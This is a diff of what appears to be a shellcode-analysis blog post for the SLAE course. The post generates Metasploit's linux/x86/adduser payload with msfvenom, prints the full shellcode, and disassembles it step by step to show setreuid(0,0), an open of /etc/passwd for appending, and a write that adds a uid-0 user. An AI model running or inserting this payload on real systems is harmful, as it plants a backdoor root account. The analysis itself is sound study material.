@@ -8,29 +8,41 @@ The 2nd metasploit payload we will analyze will be linux/x86/adduser.
 
 Time to set up the payload options and output the shellcode with msfvenom.
 
-msfvenom -p linux/x86/adduser PASS=SLAE USER=SLAE SHELL=/bin/sh -f c\
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\
-[-] No arch selected, selecting arch: x86 from the payload\
-No encoder or badchars specified, outputting raw payload\
-Payload size: 91 bytes\
-Final size of c file: 409 bytes\
-unsigned char buf[] = \
-"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"\
-"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"\
-"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x53\x4c"\
-"\x41\x45\x3a\x41\x7a\x72\x63\x6e\x7a\x50\x59\x6c\x66\x72\x32"\
-"\x45\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"\
-"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"\
+msfvenom -p linux/x86/adduser PASS=SLAE USER=SLAE SHELL=/bin/sh -f c
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+
+[-] No arch selected, selecting arch: x86 from the payload
+
+No encoder or badchars specified, outputting raw payload
+
+Payload size: 91 bytes
+
+Final size of c file: 409 bytes
+
+unsigned char buf[] = 
+
+"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
+
+"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
+
+"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x53\x4c"
+
+"\x41\x45\x3a\x41\x7a\x72\x63\x6e\x7a\x50\x59\x6c\x66\x72\x32"
+
+"\x45\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
+
+"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
+
 "\x80";
 
-Time to make sure it works.  Place shellcode in to the wrapper, compile with proper flags, then run this with elevated permissions.  Since we are editing /etc/passwd, this will need to be run with sudo OR change permissions to your /etc/passwd file (probably not the best idea).
-
+Time to make sure it works.  Place shellcode in the c wrapper, compile with proper flags, then run this with elevated permissions.  Since we are editing /etc/passwd, this will need to be run with sudo OR change permissions to your /etc/passwd file then revert after testing.  Steps for the c wrapper and compiler flags can be found in my first two SLAE posts - Shell Bind TCP and Shell Reverse TCP.
 ```
 sudo ./shellcode2
 [sudo] password for pwoer: 
 Shellcode Length:  40
 ```
-Successfully ran without any errors.. Lets take a look at the bottom of the /etc/passwd file now.
+Successfully ran without any errors.. Let's take a look at the bottom of the /etc/passwd file now.
 ```
 cat /etc/passwd
 pwoer:x:1000:1000:gg,,,:/home/pwoer:/bin/bash
@@ -89,16 +101,19 @@ echo -ne "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x
 00000058  58                pop eax
 00000059  CD80              int 0x80
 ```
-As you can see, it takes the shellcode and converts it into readable assembly.  The 2nd column is actually our opcodes!
+As you can see, it takes the shellcode and converts it in to readable assembly.  The 2nd column is actually our opcodes!
 
-We can see multiple int 0x80's at:\
-  00000007\
-  00000023\
-  00000054\
+We can see multiple int 0x80's at:
+
+  00000007
+  
+  00000023
+  
+  00000054
+  
   00000059
 
 These will be our focus points for the analysis so we can figure out which syscalls are happening throughout the shellcode.
-
 ```
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
@@ -106,7 +121,8 @@ These will be our focus points for the analysis so we can figure out which sysca
 00000006  58                pop eax
 00000007  CD80              int 0x80
 ```
-We zero out both ECX and EBX.\
+We zero out both ECX and EBX.
+
 Then EAX is set to 0x46
 ```shell
 cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 70
@@ -117,7 +133,8 @@ So our syscall here is setreuid with args - 0 and 0
 
 > setreuid(0, 0);
 
-What this call does is sets our process to run as both real and effective id - 0 (root).\
+What this call does is sets our process to run as both real and effective id - 0 (root).
+
 Our next syscall block is:
 ```nasm
 00000009  6A05              push byte +0x5
@@ -141,7 +158,7 @@ Open is defined as:
 ```c
 int open(const char *pathname, int flags);
 ```
-Next instructions:
+The next instructions:
 ```nasm
 xor,ecx ecx
 push ecx
@@ -159,13 +176,14 @@ This is pushing a string to the stack and terminating it with a null byte (ECX).
 >>> binascii.unhexlify('64777373')
 'dwss'
 ```
-With Little Endian, this translates to-- '/etc//passwd'.  So, as expected, we are going to be opening /etc/passwd in order to add a user.  The double '/' in the middle is a way to make the string fit into the qword size so there arent any issues with pushing the strings to the stack.  The trick uses the idea that the file path can have as many '/' in a row and it will still read the path as if it only has 1 slash in it. For example, /etc//////passwd, or /////etc/passwd both will be read as '/etc/passwd'.
+With Little Endian, this translates to-- '/etc//passwd'.  So, as expected, we are going to be opening /etc/passwd in order to add a user.  The double '/' in the middle is a way to make the string fit into the dword size so there aren't any compilcations with pushing the strings to the stack.  The trick uses the idea that the file path can have as many '/' in a row and it will still read the path as if it only has 1 slash in it. For example, /etc//////passwd, or /////etc/passwd both will be read as '/etc/passwd'.
 ```nasm
 inc ecx
 mov ch,0x4
 int 0x80
 ```
-ECX will hold the flag value for how we want to open the file.  1 means O_WRONLY. Next, 0x4 is moved into ch. ch is the upper 2 bytes of CX. Meaning CX is now 0x0401.  The flag constants are defined with octal values.  0x400 is octal 02000 which is defined as O_APPEND.\
+ECX will hold the flag value for how we want to open the file.  1 means O_WRONLY. Next, 0x4 is moved into ch. ch is the upper 2 bytes of CX. Meaning CX is now 0x0401.  The flag constants are defined with octal values.  0x400 is octal 02000 which is defined as O_APPEND.
+
 The next instruction is the interrupt that calls open('/etc//passwd', O_WRONLY|O_APPEND);
 ```nasm
 00000025  93                xchg eax,ebx
@@ -175,8 +193,9 @@ The next instruction is the interrupt that calls open('/etc//passwd', O_WRONLY|O
 0000004F  51                push ecx
 00000050  FC                cld
 ```
-the xchg instruction moves our return value from open to the ebx register -- our file descriptor.\
-It seems our instructions at the called location are off by a bit.  Let's open up gdb to see if we can get the proper instructions so we are walking through the right steps.. Lets disassemble the shellcode portion so we can find the proper address..
+The xchg instruction moves our return value from open to the EBX register -- our file descriptor.
+
+It seems our instructions at the called location are off by a bit.  Let's open up gdb to see if we can get the proper instructions so we are walking through the right steps.. Let's disassemble the shellcode portion so we can find the proper address..
 ```nasm
 gdb-peda$ disas
 Dump of assembler code for function code:
@@ -231,7 +250,7 @@ Dump of assembler code for function code:
 End of assembler dump.
 gdb-peda$ 
 ```
-Our call is "call 0x804a08d".  Looking at that address, we see the same thing where the instruction addresses dont seem to fit into what we are expecting.  We can view instructions for the specific address that is being called with the x/i command.  Let's just grab a random number of instructions and see if it catches back up with the proper instructions.
+Our call is "call 0x804a08d" at address 0x0804a066.  Looking at the called address, we see the same issue where the instruction addresses dont seem to fit into what we are expecting.  We can view instructions for the specific address that is being called with the x/i command.  Let's just grab a random number of instructions and see if it catches back up with the proper instructions.
 ```nasm
 gdb-peda$ x/6i 0x804a08d
    0x804a08d <code+77>:	pop    ecx
@@ -252,19 +271,20 @@ We are seeing the call-pop technique here used to push an address on the stack t
 gdb-peda$ x/s 0x804a06b
 0x804a06b <code+43>:	"SLAE:AzrcnzPYlfr2E:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀"
 ```
-There we have it, the entry we will be appending to /etc/passwd.  So now we know that we have our file descriptor from the open saved in ebx, and the string we are appending saved in ecx.
+There we have it, the entry we will be appending to /etc/passwd.  So, now we know that we have our file descriptor from the open saved in EBX, and the string we are appending saved in ECX.
 
 The next instruction is very clever.  Looking at our opcodes for the call instruction, we have E822000000 which translates to:
 ```
 ndisasm> E822000000
 E822000000               call dword 0x27
 ```
-Since our string is what we are jumping over, the length of our string is stored as the "22" part of our opcode.  The string is 34 characters in length (including the \n) which translates to 22 hex.  Our next instruction is "mov edx, DWORD PTR \[ecx-0x4\]".  Which points us right at the length of the string!\
+Since our string is what we are jumping over, the length of our string is stored as the "22" part of the opcode.  The string is 34 characters in length (including the \n) which translates to 22 hex.  Our next instruction is "mov edx, DWORD PTR \[ecx-0x4\]".  Which points us right at the length of the string we just jumped over!
+
 Finishing up the syscall, EAX is set to 4 which is write:
 ```c
 ssize_t write(int fd, const void *buf, size_t count); 
 ```
-Our interrupt is called so our two syscalls equate to:\
+Our interrupt is called so our two syscalls equate to:
 ```c
 fd = open('/etc//passwd', O_WRONLY|O_APPEND);
 buf = "SLAE:AzrcnzPYlfr2E:0:0::/:/bin/sh\n";
